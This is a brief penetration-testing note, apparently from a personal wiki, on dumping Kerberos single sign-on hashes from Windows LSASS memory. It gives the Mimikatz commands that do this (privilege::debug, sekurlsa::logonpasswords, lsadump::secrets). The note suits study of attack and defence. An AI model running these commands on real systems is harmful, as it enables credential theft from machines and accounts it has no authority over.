Hashes for single sign on for kerberos are stored in the _Local Security Authority Subsystem Service_ (LSASS) space. Since the LSASS process is part of the operating system and runs as SYSTEM, we need SYSTEM (or local administrator) permissions to gain access to the hashes stored on a target. To exploit this we use [[Mimikatz]]

```
.\mimikatz.exe
```
```
privilege::debug
```
```
sekurlsa::logonpasswords
```
```
lsadump::secrets
```
